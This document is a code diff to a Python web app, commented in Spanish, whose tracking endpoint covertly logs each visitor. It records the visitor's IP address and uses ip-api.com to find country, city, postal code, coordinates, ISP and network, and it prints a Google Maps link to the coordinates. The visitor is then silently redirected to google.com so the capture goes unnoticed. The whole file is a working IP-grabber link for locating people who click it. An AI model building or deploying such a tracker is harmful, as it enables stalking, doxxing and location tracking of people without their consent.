@@ -10,7 +10,7 @@ LOG_FILE = "ip_logs.txt"
 # Asegura que el archivo exista desde el arranque
 if not os.path.exists(LOG_FILE):
     with open(LOG_FILE, "w", encoding="utf-8") as f:
-        f.write("Timestamp | IP | País | Región | Ciudad | Distrito | CP | Coordenadas | Zona horaria | ISP | Organización | AS | Móvil | Proxy\n")
+        f.write("Fecha y hora | IP | País | Región | Ciudad | ZIP | Coordenadas | Zona Horaria | ISP | Organización | AS\n")
 
 @app.get("/")
 def root():
@@ -22,18 +22,25 @@ async def track(request: Request):
     x_forwarded_for = request.headers.get('X-Forwarded-For')
     ip = x_forwarded_for.split(',')[0] if x_forwarded_for else request.client.host
     
-    # Consulta información geográfica detallada
+    # Consulta información geográfica con más precisión
     info = {
-        "country": "Desconocido", "countryCode": "Desconocido", "region": "Desconocido", 
-        "regionName": "Desconocido", "city": "Desconocido", "district": "Desconocido",
-        "zip": "Desconocido", "lat": "Desconocido", "lon": "Desconocido", 
-        "timezone": "Desconocido", "isp": "Desconocido", "org": "Desconocido", 
-        "as": "Desconocido", "mobile": "Desconocido", "proxy": "Desconocido"
+        "country": "Desconocido", 
+        "countryCode": "Desconocido",
+        "region": "Desconocido", 
+        "regionName": "Desconocido",
+        "city": "Desconocido", 
+        "zip": "Desconocido",
+        "lat": "Desconocido",
+        "lon": "Desconocido",
+        "timezone": "Desconocido",
+        "isp": "Desconocido",
+        "org": "Desconocido",
+        "as": "Desconocido"
     }
     try:
         async with httpx.AsyncClient() as client:
-            # Solicita todos los campos disponibles
-            r = await client.get(f"http://ip-api.com/json/{ip}?fields=status,message,continent,continentCode,country,countryCode,region,regionName,city,district,zip,lat,lon,timezone,offset,currency,isp,org,as,asname,mobile,proxy,hosting,query")
+            # Usa la API con más campos para mayor precisión
+            r = await client.get(f"http://ip-api.com/json/{ip}?fields=status,message,country,countryCode,region,regionName,city,zip,lat,lon,timezone,isp,org,as,query")
             data = r.json()
             if data["status"] == "success":
                 info["country"] = data.get("country", "Desconocido")
@@ -41,7 +48,6 @@ async def track(request: Request):
                 info["region"] = data.get("region", "Desconocido")
                 info["regionName"] = data.get("regionName", "Desconocido")
                 info["city"] = data.get("city", "Desconocido")
-                info["district"] = data.get("district", "Desconocido")
                 info["zip"] = data.get("zip", "Desconocido")
                 info["lat"] = data.get("lat", "Desconocido")
                 info["lon"] = data.get("lon", "Desconocido")
@@ -49,46 +55,37 @@ async def track(request: Request):
                 info["isp"] = data.get("isp", "Desconocido")
                 info["org"] = data.get("org", "Desconocido")
                 info["as"] = data.get("as", "Desconocido")
-                info["mobile"] = "Sí" if data.get("mobile", False) else "No"
-                info["proxy"] = "Sí" if data.get("proxy", False) else "No"
     except Exception as e:
         print(f"Error al obtener información geográfica: {e}")
     
-    # Prepara la información detallada para logging
+    # Prepara la información para logging con mayor detalle
     timestamp = datetime.now().isoformat()
-    log_line = (f"{timestamp} | IP: {ip} | País: {info['country']} ({info['countryCode']}) | "
-                f"Región: {info['regionName']} ({info['region']}) | Ciudad: {info['city']} | "
-                f"Distrito: {info['district']} | CP: {info['zip']} | "
-                f"Coordenadas: {info['lat']}, {info['lon']} | Zona horaria: {info['timezone']} | "
-                f"ISP: {info['isp']} | Org: {info['org']} | AS: {info['as']} | "
-                f"Móvil: {info['mobile']} | Proxy: {info['proxy']}\n")
+    log_line = (f"{timestamp} | IP: {ip} | Country: {info['country']} ({info['countryCode']}) | "
+                f"Region: {info['regionName']} ({info['region']}) | City: {info['city']} | "
+                f"ZIP: {info['zip']} | Coords: {info['lat']},{info['lon']} | "
+                f"Timezone: {info['timezone']} | ISP: {info['isp']} | "
+                f"Org: {info['org']} | AS: {info['as']}\n")
     
     # Guarda la información en el archivo
     with open(LOG_FILE, "a", encoding="utf-8") as f:
         f.write(log_line)
     
-    # Muestra la información detallada en consola
+    # Muestra la información en consola con mayor detalle
     print("=" * 100)
-    print("🌍 NUEVO VISITANTE DETECTADO:")
-    print(f"📅 Timestamp: {timestamp}")
-    print(f"🌐 IP: {ip}")
-    print(f"🏳️  País: {info['country']} ({info['countryCode']})")
-    print(f"🗺️  Región: {info['regionName']} ({info['region']})")
-    print(f"🏙️  Ciudad: {info['city']}")
-    if info['district'] != "Desconocido":
-        print(f"🏘️  Distrito: {info['district']}")
-    if info['zip'] != "Desconocido":
-        print(f"📮 Código Postal: {info['zip']}")
+    print("NUEVO VISITANTE DETECTADO:")
+    print(f"Timestamp: {timestamp}")
+    print(f"IP: {ip}")
+    print(f"País: {info['country']} ({info['countryCode']})")
+    print(f"Región: {info['regionName']} ({info['region']})")
+    print(f"Ciudad: {info['city']}")
+    print(f"Código Postal: {info['zip']}")
+    print(f"Coordenadas: {info['lat']}, {info['lon']}")
+    print(f"Zona Horaria: {info['timezone']}")
+    print(f"ISP: {info['isp']}")
+    print(f"Organización: {info['org']}")
+    print(f"Sistema Autónomo: {info['as']}")
     if info['lat'] != "Desconocido" and info['lon'] != "Desconocido":
-        print(f"📍 Coordenadas: {info['lat']}, {info['lon']}")
-        print(f"🗺️  Google Maps: https://www.google.com/maps?q={info['lat']},{info['lon']}")
-    print(f"🕐 Zona horaria: {info['timezone']}")
-    print(f"🌐 ISP: {info['isp']}")
-    if info['org'] != "Desconocido" and info['org'] != info['isp']:
-        print(f"🏢 Organización: {info['org']}")
-    print(f"🔢 AS: {info['as']}")
-    print(f"📱 Conexión móvil: {info['mobile']}")
-    print(f"🛡️  Usando proxy: {info['proxy']}")
+        print(f"Google Maps: https://www.google.com/maps?q={info['lat']},{info['lon']}")
     print("=" * 100)
     
     return RedirectResponse("https://www.google.com")
